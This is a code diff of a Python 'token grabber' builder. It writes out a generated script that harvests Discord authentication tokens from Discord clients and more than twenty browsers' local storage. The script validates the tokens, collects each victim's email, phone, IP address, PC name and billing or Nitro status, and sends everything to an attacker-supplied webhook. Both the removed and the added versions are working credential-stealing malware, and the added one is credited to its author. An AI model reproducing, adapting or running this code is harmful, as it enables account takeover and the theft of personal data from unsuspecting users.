@@ -29,169 +29,112 @@ def tokengrabber():
 
     try:
         with open(f"output/{fileName}.py", "w") as file:
-            file.write("""import os
-if os.name != "nt":
-    exit()
-from re import findall
-from json import loads, dumps
-from base64 import b64decode
+            file.write("""import os, re, json, requests, threading
+from datetime import datetime
 from subprocess import Popen, PIPE
 from urllib.request import Request, urlopen
-from datetime import datetime
-from threading import Thread
-from time import sleep
-from sys import argv
-LOCAL = os.getenv("LOCALAPPDATA")
-ROAMING = os.getenv("APPDATA")
-PATHS = {
-    "Discord"           : ROAMING + "\\\\Discord",
-    "Discord Canary"    : ROAMING + "\\\\discordcanary",
-    "Discord PTB"       : ROAMING + "\\\\discordptb",
-    "Google Chrome"     : LOCAL + "\\\\Google\\\\Chrome\\\\User Data\\\\Default",
-    "Opera"             : ROAMING + "\\\\Opera Software\\\\Opera Stable",
-    "Brave"             : LOCAL + "\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default",
-    "Yandex"            : LOCAL + "\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default"
-}
-def getheaders(token=None, content_type="application/json"):
-    headers = {
-        "Content-Type": content_type,
-        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
-    }
-    if token:
-        headers.update({"Authorization": token})
-    return headers
-def getuserdata(token):
-    try:
-        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
-    except:
-        pass
-def gettokens(path):
-    path += "\\\\Local Storage\\\\leveldb"
-    tokens = []
-    for file_name in os.listdir(path):
-        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
-            continue
-        for line in [x.strip() for x in open(f"{path}\\\\{file_name}", errors="ignore").readlines() if x.strip()]:
-            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-                for token in findall(regex, line):
-                    tokens.append(token)
-    return tokens
 def getip():
     ip = "None"
     try:
         ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
-    except:
-        pass
+    except: pass
     return ip
-def getavatar(uid, aid):
-    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
-    try:
-        urlopen(Request(url))
-    except:
-        url = url[:-4]
-    return url
 def gethwid():
     p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
     return (p.stdout.read() + p.stderr.read()).decode().split("\\n")[1]
-def getchat(token, uid):
-    try:
-        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
-    except:
-        pass
-def has_payment_methods(token):
-    try:
-        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
-    except:
-        pass
-def send_message(token, chat_id, form_data):
-    try:
-        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
-    except:
-        pass
 def main():
-    cache_path = ROAMING + "\\\\.cache~$"
-    embeds = []
-    working = []
-    checked = []
-    already_cached_tokens = []
-    working_ids = []
-    ip = getip()
-    pc_username = os.getenv("UserName")
-    pc_name = os.getenv("COMPUTERNAME")
-    for platform, path in PATHS.items():
-        if not os.path.exists(path):
-            continue
-        for token in gettokens(path):
-            if token in checked:
-                continue
-            checked.append(token)
-            uid = None
-            if not token.startswith("mfa."):
-                try:
-                    uid = b64decode(token.split(".")[0].encode()).decode()
-                except:
-                    pass
-                if not uid or uid in working_ids:
-                    continue
-            user_data = getuserdata(token)
-            if not user_data:
-                continue
-            working_ids.append(uid)
-            working.append(token)
-            username = user_data["username"] + "#" + str(user_data["discriminator"])
-            user_id = user_data["id"]
-            avatar_id = user_data["avatar"]
-            avatar_url = getavatar(user_id, avatar_id)
-            email = user_data.get("email")
-            phone = user_data.get("phone")
-            nitro = bool(user_data.get("premium_type"))
-            billing = bool(has_payment_methods(token))
-            embed = {
-                "color": 0x7289da,
-                "fields": [
-                    {
-                        "name": "**Account Info**",
-                        "value": f'Email: {email}\\nPhone: {phone}\\nNitro: {nitro}\\nBilling Info: {billing}',
-                        "inline": True
-                    },
-                    {
-                        "name": "**PC Info**",
-                        "value": f'IP: {ip}\\nUsername: {pc_username}\\nPC Name: {pc_name}\\nToken Location: {platform}',
-                        "inline": True
-                    },
-                    {
-                        "name": "**Token**",
-                        "value": token,
-                        "inline": False
-                    }
-                ],
-                "author": {
-                    "name": f"{username} ({user_id})",
-                    "icon_url": avatar_url
-                },
-                "footer": {
-                
+    def get_tokens():
+        found_tokens = []
+        path = [
+        '_Roaming/Discord/Local Storage/leveldb',
+        '_Roaming/Lightcord/Local Storage/leveldb',
+        '_Roaming/discordptb/Local Storage/leveldb',
+        '_Roaming/discordcanary/Local Storage/leveldb',
+        '_Roaming/Opera Software/Opera Stable/Local Storage/leveldb',
+        '_Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb',
+        '_Local/Amigo/User Data/Local Storage/leveldb',
+        '_Local/Torch/User Data/Local Storage/leveldb',
+        '_Local/Kometa/User Data/Local Storage/leveldb',
+        '_Local/Orbitum/User Data/Local Storage/leveldb',
+        '_Local/CentBrowser/User Data/Local Storage/leveldb',
+        '_Local/7Star/7Star/User Data/Local Storage/leveldb',
+        '_Local/Sputnik/Sputnik/User Data/Local Storage/leveldb',
+        '_Local/Vivaldi/User Data/Default/Local Storage/leveldb',
+        '_Local/Google/Chrome SxS/User Data/Local Storage/leveldb',
+        '_Local/Epic Privacy Browser/User Data/Local Storage/leveldb',
+        '_Local/Google/Chrome/User Data/Default/Local Storage/leveldb',
+        '_Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb',
+        '_Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb',
+        '_Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb',
+        '_Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb',
+        '_Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb',
+        ]
+        for path in path:
+            path = path.replace('_Local', os.getenv('LOCALAPPDATA')).replace('_Roaming', os.getenv('APPDATA'))
+            if os.path.exists(path):
+                for file_name in os.listdir(path):
+                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', line):
+                            found_tokens.append(token)
+        return list(set(found_tokens))
+    def check_tokens(token_list: list):
+        checked_tokens = []
+        checker_thread = []
+        def check(token: str):
+            try:
+                res = urlopen(Request('https://discord.com/api/v9/users/@me/library', headers= {'content-type': 'application/json', 'authorization': token, 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}, method= 'GET')).getcode()
+                if res == 200:
+                    checked_tokens.append(token)
+            except: pass
+        for token in token_list:
+            checker_thread.append(threading.Thread(target= check, args=(token,)))
+        valid_tokens = ''
+        for token in checked_tokens:
+            valid_tokens += f'\\n{token}'
+        return valid_tokens
+    def start():
+        tokens = check_tokens(get_tokens())
+        if tokens != '':
+            try:
+                headers = {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                 }
-            }
-            embeds.append(embed)
-    with open(cache_path, "a") as file:
-        for token in checked:
-            if not token in already_cached_tokens:
-                file.write(token + "\\n")
-    if len(working) == 0:
-        working.append('123')
-    webhook = {
-        "content": "",
-        "embeds": embeds,
-        "username": "Discord Token Grabber",
-        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
-    }
-    try:
-        urlopen(Request("~~TOKENURLHERE~~", data=dumps(webhook).encode(), headers=getheaders()))
-    except:
-        pass
-
-main()""".replace("~~TOKENURLHERE~~", webhooklink))
+                res = requests.get('https://discordapp.com/api/v6/users/@me', headers={"Authorization": tokens})
+                res_json = res.json()
+                ip = getip()
+                pc_username = os.getenv("UserName")
+                pc_name = os.getenv("COMPUTERNAME")
+                user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
+                user_id = res_json['id']
+                email = res_json['email']
+                phone = res_json['phone']
+                mfa_enabled = res_json['mfa_enabled']
+                has_nitro = False
+                res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers={"Authorization": tokens})
+                nitro_data = res.json()
+                has_nitro = bool(len(nitro_data) > 0)
+                days_left = 0
+                if has_nitro:
+                    d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                    d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                    days_left = abs((d2 - d1).days)
+                embed = f\"""**{user_name}** *({user_id})*\\n
+> :dividers: __Account Information__\\n\\tEmail: `{email}`\\n\\tPhone: `{phone}`\\n\\t2FA/MFA Enabled: `{mfa_enabled}`\\n\\tNitro: `{has_nitro}`\\n\\tExpires in: `{days_left if days_left else "None"} day(s)`\\n
+> :computer: __PC Information__\\n\\tIP: `{ip}`\\n\\tUsername: `{pc_username}`\\n\\tPC Name: `{pc_name}`\\n
+> :shield: __Token__\\n\\t`{tokens}`\\n
+*Made by Astraa#6100* **|** ||https://github.com/astraadev||\"""
+                payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by Astraa', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
+                try:
+                    req = Request('~~WEBHOOK_URL~~', data=payload.encode(), headers=headers)
+                    urlopen(req)
+                except: pass
+            except: pass
+    start()
+if __name__ == '__main__':
+    main()""".replace("~~WEBHOOK_URL~~", webhooklink))
 
     except Exception as e:
         print(f"""\n\n\n\n{y}[{Fore.LIGHTRED_EX }!{y}]{w}  Error writing file: {e}""")
